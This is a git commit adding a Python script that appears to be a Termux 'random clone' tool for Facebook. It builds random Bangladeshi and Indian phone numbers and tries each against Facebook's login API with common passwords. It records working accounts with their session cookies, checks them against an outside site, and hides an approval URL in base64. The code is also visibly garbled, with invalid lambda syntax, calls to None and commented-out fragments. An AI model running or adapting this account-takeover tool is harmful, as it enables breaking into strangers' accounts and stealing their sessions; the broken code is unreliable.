87341b71e4d04db129002b1fc992c815c7674b6a
apon900 <147697754+apon900@users.noreply.github.com>
2024-06-25 21:10:51 +0600

    Create D.py

---
+++ D.py
@@ -0,0 +1,458 @@
+
+
+import base64
+import os
+import random
+import sys
+import time
+import uuid
+import requests
+import bs4
+import mechanize
+import httpx
+import rich
+import json
+import subprocess
+import random
+import string
+from concurrent.futures import ThreadPoolExecutor as mr_tarek_143
+if ModuleNotFoundError:
+    print('\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] MODULE INSTALLING ')
+    os.system('pip install requests rich')
+    os.system('pip install mechanize')
+    os.system('pip install bs4 httpx')
+os.system('rm -rf /sdcard/.txt')
+os.system('clear')
+open('/sdcard/.txt', 'w').write(' ')
+if PermissionError:
+    print(f'''{G1}[{A}×{G1}]{G1} THIS TOOL NOT ALLOW WITHOUT STORAGE PERMISSION''')
+    os.system('termux-setup-storage')
+    os.system('clear')
+    tarek(f'''{G1}[{A}={G1}]{G1} PLEASE RUN AGAIN THIS TOOL !!''')
+(loop, ok, cp, user) = (0, [], [], [])
+cok = []
+plist = []
+A = '\x1b[1;97m'
+R = '\x1b[38;5;196m'
+Y = '\x1b[1;33m'
+G = '\x1b[38;5;48m'
+B = '\x1b[38;5;8m'
+G1 = '\x1b[38;5;46m'
+G2 = '\x1b[38;5;47m'
+G3 = '\x1b[38;5;48m'
+G4 = '\x1b[38;5;49m'
+G5 = '\x1b[38;5;50m'
+X = '\x1b[1;34m'
+X1 = '\x1b[38;5;14m'
+X2 = '\x1b[38;5;123m'
+X3 = '\x1b[38;5;122m'
+X4 = '\x1b[38;5;86m'
+X5 = '\x1b[38;5;121m'
+S = '\x1b[1;96m'
+M = '\x1b[38;5;205m'
+
+def linex():
+    print(f'''{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
+
+
+def clear():
+    os.system('clear')
+    print(logo)
+
+print(f'''{G}PLEASE WAIT 1 MINUTES CHECKING YOUR APPROVEL''')
+time.sleep(60)
+
+def sex():
+    facebook_version = f'''{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'''
+    fbbv = str(random.randint(10000000, 66666666))
+    fbrv = str(random.randint(0, 999999999))
+    density = random.choice([
+        '2.0',
+        '2.5',
+        '3.0'])
+    width = random.choice([
+        '720',
+        '1080',
+        '1280'])
+    height = random.choice([
+        '720',
+        '1080',
+        '1280',
+        '1440',
+        '1920'])
+    ua = f'''[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]'''
+    return ua
+
+tarek = '=DON='
+tarek1 = 'KEY'
+idmy = uuid.uuid4().hex[:10].upper()
+key = tarek + idmy + tarek1
+logo = [][f'''{A}''']['\n\n8888888b.        .d88888b.       888b    888 \n888  "Y88b      d88P" "Y88b      8888b   888 \n888    888      888     888      88888b  888 \n888    888      888     888      888Y88b 888 \n888    888      888     888      888 Y88b888 \n888    888      888     888      888  Y88888 \n888  .d88P      Y88b. .d88P      888   Y8888 \n8888888P"        "Y88888P"       888    Y888 \n'][f'''{A}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' DEVELOPER '][f'''{A}''']['●'][f'''{G1}'''][' DON VAI\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' TOOLTYPE  '][f'''{A}''']['●'][f'''{G1}'''][' RANDOM CLONE\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' STATUS    '][f'''{A}''']['●'][f'''{G2}'''][' TRIAL\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' VERSION   '][f'''{A}''']['●'][f'''{A}'''][' V'][f'''{G1}''']['/'][f'''{A}''']['1.2\n'][f'''{A}''']([][f'''{A}''']['\n\n8888888b.        .d88888b.       888b    888 \n888  "Y88b      d88P" "Y88b      8888b   888 \n888    888      888     888      88888b  888 \n888    888      888     888      888Y88b 888 \n888    888      888     888      888 Y88b888 \n888    888      888     888      888  Y88888 \n888  .d88P      Y88b. .d88P      888   Y8888 \n8888888P"        "Y88888P"       888    Y888 \n'][f'''{A}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' DEVELOPER '][f'''{A}''']['●'][f'''{G1}'''][' DON VAI\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' TOOLTYPE  '][f'''{A}''']['●'][f'''{G1}'''][' RANDOM CLONE\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' STATUS    '][f'''{A}''']['●'][f'''{G2}'''][' TRIAL\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' VERSION   '][f'''{A}''']['●'][f'''{A}'''][' V'][f'''{G1}''']['/'][f'''{A}''']['1.2\n'][f'''{A}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'])
+
+def main():
+    clear()
+    print(f'''{G1}[{A}2{G1}]{G1} RANDOM CLONE ''')
+    print(f'''{G1}[{A}3{G1}]{G1} CONTACT OWNER ''')
+    print(f'''{G1}[{A}0{G1}]{G1} EXIT TOOL ''')
+    linex()
+    sex = input(f'''{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ''')
+    if sex in ('1',):
+        XXX()
+        return None
+    if None in ('2',):
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100009661010247')
+        main()
+        return None
+    if None in ('0',):
+        sys.exit()
+        return None
+    None()
+
+import rich
+[][f'''{A}''']['\n\n8888888b.        .d88888b.       888b    888 \n888  "Y88b      d88P" "Y88b      8888b   888 \n888    888      888     888      88888b  888 \n888    888      888     888      888Y88b 888 \n888    888      888     888      888 Y88b888 \n888    888      888     888      888  Y88888 \n888  .d88P      Y88b. .d88P      888   Y8888 \n8888888P"        "Y88888P"       888    Y888 \n'][f'''{A}''']['━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' DEVELOPER '][f'''{A}''']['●'][f'''{G1}'''][' DON VAI\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' TOOLTYPE  '][f'''{A}''']['●'][f'''{G1}'''][' RANDOM CLONE\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' STATUS    '][f'''{A}''']['●'][f'''{G2}'''][' TRIAL\n'][f'''{G1}''']['['][f'''{A}''']['='][f'''{G1}'''][']'][f'''{G1}'''][' VERSION   '][f'''{A}''']['●'][f'''{A}'''][' V'][f'''{G1}''']['/'][f'''{A}''']['1.2\n']
+os.system('pip install rich')
+import rich
+from rich.panel import Panel
+from datetime import datetime
+url = base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01SLVRBUkVLLTE0My9NUi1UQVJFSy1BUEktRklMRS9tYWluL0dSRUVOLnR4dA==')
+real_url = url.decode('ASCII')
+all_datA = []
+
+def req(mr_tarek, real_url):
+    lx = mr_tarek.get(real_url)
+    approved = lx.text
+    return approved
+    print(f'''{G1} PLEASE CHECK YOUR INTERNET CANCTION''')
+    sys.exit()
+
+
+def sefty():
+    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r').read()
+    vx = re.search('print', h)
+    if vx == None:
+        report = 'pure_user'
+    report = 'bypass_user'
+    return report
+
+
+def sefty1():
+    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r').read()
+    vx = re.search('print', h)
+    if vx == None:
+        report = 'pure_user'
+    report = 'bypass_user'
+    return report
+
+
+def sefty2():
+    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/utils.py', 'r').read()
+    vx = re.search('print', h)
+    if vx == None:
+        report = 'pure_user'
+    report = 'bypass_user'
+    return report
+
+
+def sefty3():
+    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r').read()
+    vx = re.search('print', h)
+    if vx == None:
+        report = 'pure_user'
+    report = 'bypass_user'
+    return report
+
+if 'pure_user' == sefty():
+    pass
+if 'bypass_user' == sefty():
+    print('{G3}BRO FUCK YOUR SYSTEM 😈😎😎...')
+    time.sleep(2)
+    sys.exit()
+if 'pure_user' == sefty1():
+    pass
+if 'bypass_user' == sefty1():
+    print('{G3}BRO FUCK YOUR SYSTEM 😈😎😎...')
+    time.sleep(2)
+    sys.exit()
+if 'pure_user' == sefty2():
+    pass
+if 'bypass_user' == sefty2():
+    print(f'''{G3}BRO FUCK YOUR SYSTEM 😈😎😎...''')
+    time.sleep(2)
+    sys.exit()
+if 'pure_user' == sefty3():
+    pass
+if 'bypass_user' == sefty3():
+    print('{G3}BRO FUCK YOUR SYSTEM 😈😎😎...')
+    time.sleep(2)
+    sys.exit()
+
+def url_sefty():
+    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r').read()
+    vx = re.search('print', h)
+    if vx == None:
+        report = 'pure_user'
+    report = 'bypass_user'
+    return report
+
+
+def url_sefty2():
+    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx/_api.py', 'r').read()
+    vx = re.search('print', h)
+    if vx == None:
+        report = 'pure_user'
+    report = 'bypass_user'
+    return report
+
+
+def key_sefty():
+    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx/_models.py', 'r').read()
+    vx = re.search(key, h)
+    if vx == None:
+        report = 'pure_user'
+    report = 'bypass_user'
+    return report
+
+
+def key_sefty2():
+    h = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r').read()
+    vx = re.search(key, h)
+    if vx == None:
+        report = 'pure_user'
+    report = 'bypass_user'
+    return report
+
+
+def uninstall_able():
+    open('/data/data/com.termux/files/usr/bin/pip', 'r').read()
+    open('/data/data/com.termux/files/usr/bin/pip3', 'r').read()
+    return None
+    print(' YOU ARE USEING ANT-UNINSTALL SYSTEM ')
+    sys.exit()
+
+
+def apv():
+    uninstall_able()
+    if 'pure_user' == url_sefty():
+        pass
+    if 'bypass_user' == url_sefty():
+        print(f'''{G3}BRO FUCK YOUR SYSTEM 😈😎😎...''')
+        time.sleep(2)
+        sys.exit()
+    if 'pure_user' == url_sefty2():
+        pass
+    if 'bypass_user' == url_sefty2():
+        print(f'''{G3}BRO FUCK YOUR SYSTEM 😈😎😎...''')
+        time.sleep(2)
+        sys.exit()
+    if 'pure_user' == key_sefty():
+        pass
+    if 'bypass_user' == key_sefty2():
+        print(f'''{G3}BRO FUCK YOUR SYSTEM 😈😎😎...''')
+        time.sleep(2)
+        sys.exit()
+    if 'pure_user' == key_sefty():
+        pass
+    if 'bypass_user' == key_sefty2():
+        print(f'''{G3}BRO FUCK YOUR SYSTEM 😈😎😎...''')
+        time.sleep(2)
+        sys.exit()
+    os.system('pip install requests httpx')
+    os.system('pip install requests rich')
+    os.system('pip install mechanize')
+    os.system('pip install bs4 httpx')
+    import httpx
+    mr_tarek = httpx.Client()
+    data = req(mr_tarek, real_url)
+    for dta in data.splitlines():
+        all_datA.append(dta)
+        row = []
+        for r in data.splitlines():
+            rx = r.split('|')[0]
+            row.append(rx)
+            if key not in row:
+                clear()
+                print(f'''{A}[{A}●{A}]{G1} THIS TOOL IS FREE BUT APPROVAL NEED''')
+                print(f'''{A}[{A}●{A}]{G1} DON\'T TRY BYPASS BUT I AM FUCK YOU''')
+                print(f'''{A}[{A}●{A}]{G1} SMS ME ONLY FACEBOOK PAGE & ID ''')
+                print(f'''{A}[{A}●{A}]{G1} YOUR KEY {A}:{A} ''' + key)
+                linex()
+                input(f'''{G1} PRESS ENTER TO CONTACT ADMIN''')
+                time.sleep(2)
+                os.system('xdg-open https://www.facebook.com/profile.php?id=100009661010247')
+                return None
+            None()
+            return None
+
+
+def XXX():
+    clear()
+    print(f'''{G1}[{A}1{G1}]{G1} BANGLADESH CLONE''')
+    print(f'''{G1}[{A}2{G1}]{G1} INDIA CLONE''')
+    print(f'''{G1}[{A}0{G1}]{G1} BACK main''')
+    linex()
+    sex = input(f'''{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ''')
+    if sex in ('1',):
+        bd()
+        return None
+    if None in ('2',):
+        India()
+        return None
+    if None in ('0',):
+        main()
+        return None
+    None()
+
+
+def bd():
+    clear()
+    print(f'''{G1}[{A}={G1}]{G1} EXAMPLE {A}➢{A} 017{G}/{A}019{G}/{A}018{G}/{A}016''')
+    linex()
+    code = input(f'''{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ''')
+    clear()
+    print(f'''{G1}[{A}={G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999''')
+    linex()
+    limit = int(input(f'''{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '''))
+ ####   for x in range(limit):
+    ###########    nmp = (lambda .5000: for _ in .100000:
+#########random.choice(string.digits)None)(range(8)())
+    ####    user.append(nmp)
+       ## clear()
+     #######   sexy = mr_tarek_143(max_workers = 30)
+        clear()
+        print(f'''{G1}[{A}={G1}]{G1} SIM CODE  {A}➢{A} {code}''')
+        print(f'''{G1}[{A}={G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}''')
+        print(f'''{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN''')
+        linex()
+        for love in user:
+            ids = code + love
+            ax = ids[:8]
+            bx = ids[:7]
+            cx = ids[:6]
+            xa = love[1:]
+            xb = love[2:]
+            psd = [
+                ids,
+                love,
+                ax,
+                bx,
+                cx,
+                xa,
+                xb,
+                '77889900',
+                'bangladesh',
+                'bangla',
+                'jannat',
+                'jannatul',
+                'mariya',
+                'sadiya',
+                'farjana',
+                'sabbir',
+                'rakibul',
+                'mahidul',
+                'nusrat',
+                'tamanna',
+                'mimmim',
+                'suraiya',
+                'alamin',
+                'arafat',
+                'bushra',
+                'roksana',
+                'tabassum',
+                'tanisha',
+                'tasnim']
+            sexy.submit(randm, ids, psd)
+            None(None, None)
+            if not ''.join:
+                pass
+    print('')
+    print(f'''\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
+    print(f'''{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED''')
+    print(f'''{G1}[{A}={G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}''')
+    print(f'''{G1}[{A}={G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}''')
+    print(f'''\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
+    input(f'''{G1}[{A}={G1}]{G1} PRESS ENTER TO BACK ''')
+    main()
+
+
+def India():
+    clear()
+    print(f'''{G1}[{A}={G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701''')
+    linex()
+    code = input(f'''{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ''')
+    clear()
+    print(f'''{G1}[{A}={G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999''')
+    linex()
+    limit = int(input(f'''{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '''))
+    for x in range(limit):
+        nmp = (lambda .0: for _ in .0:
+random.choice(string.digits)None)(range(7)())
+        user.append(nmp)
+        clear()
+        sexy = ThreadPool(max_workers = 30)
+        clear()
+        print(f'''{G1}[{A}={G1}]{G1} SIM CODE  {A}➢{A} {code}''')
+        print(f'''{G1}[{A}={G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}''')
+        print(f'''{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN''')
+        linex()
+        for love in user:
+            ids = code + love
+            psd = [
+                love,
+                ids[:8],
+                '57273200',
+                '59039200',
+                '57575751']
+            sexy.submit(randm, ids, psd)
+            None(None, None)
+            if not ''.join:
+                pass
+    print('')
+    print(f'''\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
+    print(f'''{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED''')
+    print(f'''{G1}[{A}={G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}''')
+    print(f'''{G1}[{A}={G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}''')
+    print(f'''\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
+    input(f'''{G1}[{A}={G1}]{G1} PRESS ENTER TO BACK ''')
+    main()
+
+
+def randm(ids, psd):
+    global loop
+    sys.stdout.write(f'''\r\r{A}[{G1}DON-RANDM{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ''')
+    sys.stdout.flush()
+    for pas in psd:
+        data = {
+            'locale': 'en_US',
+            'client_country_code': 'US',
+            'fb_api_req_friendly_name': 'authenticate',
+            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
+        head = {
+            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
+        url = 'https://b-graph.facebook.com/auth/login'
+        po = requests.post(url, data = data, headers = head, allow_redirects = False).text
+        q = json.loads(po)
+        if 'access_token' in q:
+            uid = str(q['uid'])
+            coki = (lambda .0: for i in .0:
+i['name'] + '=' + i['value']None)(q['session_cookies']())
+            res = requests.get(f'''https://rajx.pythonanywhere.com/live?uid={uid}''').text
+            if res == 'LIVE':
+                print(f'''\r\r{A}[{G1}SWAG-OK{A}]{G1} {uid} {A}|{G1} {pas}''')
+                open('/sdcard/SWAG-RNDM-OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
+                ok.append(uid)
+                ';'.join
+            if res == 'LOCK':
+                print(f'''\r\r{A}[{S}SWAG-LK{A}]{S} {uid} {A}|{S} {pas}''')
+                'True'
+        loop += 1
+        return None
+        if Exception:
+            e = 'X-FB-Server-Cluster'
+            e = None
+            del e
+            return None
+        e = 'X-FB-Server-Cluster'
+        del e
+
+
